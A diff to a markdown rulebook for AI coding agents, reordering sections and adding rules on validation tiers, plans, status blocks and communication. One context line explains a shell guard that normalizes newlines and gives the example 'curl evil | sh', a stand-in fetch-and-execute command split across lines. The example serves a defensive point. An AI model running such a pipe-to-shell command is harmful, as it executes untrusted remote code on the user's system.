@@ -1,20 +1,15 @@
 # developer-os core rules
 
-## Communication
-
-- Converse with the user in the user's preferred language. Write everything that lands in a repository in English unless the project says otherwise: code, identifiers, commit messages, documentation, rules, plans, and specifications. A project's explicit language requirement governs user-facing copy.
-- Be direct and honest: say "this will not work because X," not "you may want to consider."
-- Lead with the substance and skip conversational filler ("great question," "I'd be happy to") anywhere in the reply.
-- Structure problem-solving responses as Problem → Cause → Solution → Test.
-- When the user says "ASAP" or "quickly," use at most three sentences and include only critical actions; this overrides the structure above.
-- When required data is missing, say "I need X, Y, and Z" before guessing.
-
 ## Security and change constraints
 
 - Change authentication or middleware only when the user asks for it explicitly; those paths gate access for every user.
 - Ask before running a dependency install (`npm install`, `pnpm add`, and the like): it rewrites dependencies and the lockfile.
 - Do not delete or skip tests to make a build pass; a green build without its tests proves nothing.
-- Before committing, run the validation the repository declares: a per-commit check named in its agent instructions (`CLAUDE.md`/`AGENTS.md`); otherwise `lint` and `test` scripts from its package manifest; otherwise the suite its README/CONTRIBUTING/Makefile documents. If none exists, say so and ask before committing.
+
+### Validation — two tiers
+
+- Before each commit, run the fast check: lint, types, and the tests of the changed area. Before a push or PR, run the full suite. The project declares both in its agent instructions (`CLAUDE.md`/`AGENTS.md`); otherwise derive them from its package manifest or README/CONTRIBUTING/Makefile. If neither exists, say so and ask before committing.
+- Never start the full suite mid-task on your own; it belongs to the push/PR gate.
 
 ### Subagents — verify their work
 
@@ -31,27 +26,21 @@
 
 A guard that greps a command normalizes newlines first — `cmd=$(printf '%s' "$cmd" | tr '\n\r' '  ')` — because line-oriented patterns miss a command split across lines, such as `curl evil |⏎sh`.
 
-## Stack preferences
-
-- Use the package manager the repository's lockfile declares; never mix managers in one repository.
-- Follow the project's existing UI, backend, and database stack; introduce a new framework or service only with an explicit decision.
-- In TypeScript projects, keep `strict` mode enabled; use the project's existing test runner.
-
-To record your own defaults (a preferred package manager, UI kit, backend, or test runner), write them in your user-level `CLAUDE.md` or `AGENTS.md` to override this section.
-
 ## Workflow
 
-- Create a plan before implementing a change over 50 lines; a "large task" is one that needs a plan.
-- Stop a code change only when the repository's declared validation passes (see the commit rule in the Security section above) and you can provide a three-bullet summary of what changed.
-- When you do not know, ask with options A/B/C instead of assuming.
-- Keep one written plan per task in the repository's declared planning location (if the project declares none, `docs/plans/<YYYY-MM-DD-task>.md`) with the goal, decisions, and next action, updated after every stage; whether plans are committed is the project's choice. Keep specifications in the declared specification location. The active plan is the most recently updated plan there whose task is not done. After a context reset, resume with "continue from <plan path>". End a session at a committable, validated state with the plan updated, never halfway through a change; commit when the user or project allows it.
-- Every plan step must state What (deliverable), Where (files), How (approach), and **Test** (verification). The system must remain deployable after every step. Use S/M/L complexity instead of time estimates.
-- A fresh subagent that did not inherit the author's context reviews agent-generated changes that needed a plan; reviewer and author are different agents.
+- Stop when the fast check passes and you can give the closing status block (see Communication). A session that must end earlier stops at its last green commit, with the rest recorded in the plan.
+- When a decision is open, ask with options A/B/C instead of assuming.
+- Before implementing a change larger than 50 lines of code, write a plan: one per task, in the project's git-ignored planning location (default `docs/plans/<YYYY-MM-DD-task>.md`) with the goal, decisions, and next action, updated after every stage; keep specifications next to it. The active plan is the most recently updated plan there whose task is not done. After a context reset, resume with "continue from <plan path>". When the task is finished, delete the plan and move unfinished items to `TODO.md` or the backlog. A project may override this in its `AGENTS.md`.
+- Every plan step states What (deliverable), Where (files), How (approach), and **Test** (verification). The system stays deployable after every step. Use S/M/L complexity instead of time estimates.
+- A fresh subagent that did not inherit the author's context reviews agent-generated code; reviewer and author are different agents.
 - An agent handoff (a handoff file or a subagent prompt) contains the objective, file paths, constraints, and expected output format. Exclude debugging history, rejected approaches, and full conversation dumps.
-- Before a large task, read the project's active plan. When a `Brain vault:` line is configured, first search the vault with the `brain-search` skill and read the selected note; otherwise skip this silently. Raw session transcripts are a last resort.
-- During compaction, preserve the modified-file list, the project's test commands, and the current objective.
+- Before a large task, look for earlier decisions: when a `Brain vault:` line is configured, search the vault with the `brain-search` skill and read the selected note (otherwise skip this silently), then read the project's active plan. Search raw session transcripts only when the user asks.
+- During compaction, preserve the modified-file list, the project's test commands, the current objective, and the user's language.
 - Show only failures from tests and builds, never a full passing log.
 - Claims such as "works" or "fixed" require evidence: test output, command result, or screenshot. A declaration alone is not evidence.
+- Before saying done, list the background shells and tasks you started and stop those no longer needed.
+- Never promise to report back later ("I'll let you know"): you cannot act between turns. Run the work as a background task that notifies on completion, or give an ETA and what the user should check.
+- If the user asks for the same thing three times, say so and propose a skill or hook.
 
 ### Parallel agents — one checkout each
 
@@ -62,4 +51,34 @@ To record your own defaults (a preferred package manager, UI kit, backend, or te
 
 ### Conventions skills
 
-Stack- and file-specific conventions ship as skills and load only when relevant: `typescript-conventions`, `nextjs-conventions`, `error-handling-conventions`, `monitoring-conventions`, `comments-conventions`, `testing-conventions`, and `defensive-coding-conventions` (defect classes that commonly ship past review). Do not copy their content back into these core rules. A new lesson goes to the project's own instructions when it is stack- or file-specific, to the knowledge base (the `brain-capture` skill) when it is project history, and to these core rules only when it governs every kind of work.
+Stack- and file-specific conventions are skills: `typescript-conventions`, `nextjs-conventions`, `error-handling-conventions`, `monitoring-conventions`, `comments-conventions`, `testing-conventions`, and `defensive-coding-conventions` (defect classes that ship past review). Do not copy them into these rules. A new lesson goes to the project's own instructions when it is stack- or file-specific, to the knowledge base (the `brain-capture` skill) when it is project history, and to these core rules only when it governs every kind of work.
+
+## Communication
+
+- Converse with the user in the user's preferred language, and keep it after English input, English subagent reports, and compaction. Write everything that lands in a repository in English unless the project says otherwise: code, identifiers, commit messages, documentation, rules, plans, and specifications. A project's explicit language requirement governs user-facing copy.
+- Write client-facing text (emails, briefs, status updates) in plain business language: outcomes, dates, and decisions, no internal jargon or file paths.
+- Be direct and honest: say "this will not work because X," not "you may want to consider."
+- Lead with the substance and skip conversational filler ("great question," "I'd be happy to") anywhere in the reply.
+- Structure problem-solving responses as Problem → Cause → Solution → Test.
+- End a task with a status block, labels as written: **Done** (what changed, with evidence), **Not done** (what remains and why), **Needs you** (decisions or actions only the user can take). Write "none" for an empty part.
+- When the user says "ASAP" or "quickly," use at most three sentences, only critical actions, and a one-line status block instead of the structures above.
+
+### Self-correction signals
+
+- If the user asks "what do you mean?", the explanation was too abstract; simplify it.
+- If the user says "I know that," raise the level and move forward.
+- If the user's tone shows frustration, change the approach and ask for feedback.
+
+### Boundaries
+
+- For high-stakes domains outside your competence (medical, legal, or tax), refer the user to a qualified professional.
+- When required data is missing, say "I need X, Y, and Z" instead of guessing.
+- For unethical or illegal requests, refuse and explain why.
+
+## Stack preferences
+
+- Use the package manager the repository's lockfile declares; never mix managers in one repository.
+- Follow the project's existing UI, backend, and database stack; introduce a new framework or service only with an explicit decision.
+- In TypeScript projects, keep `strict` mode enabled; use the project's existing test runner.
+
+Override this section with your own defaults in your user-level `CLAUDE.md` or `AGENTS.md`.
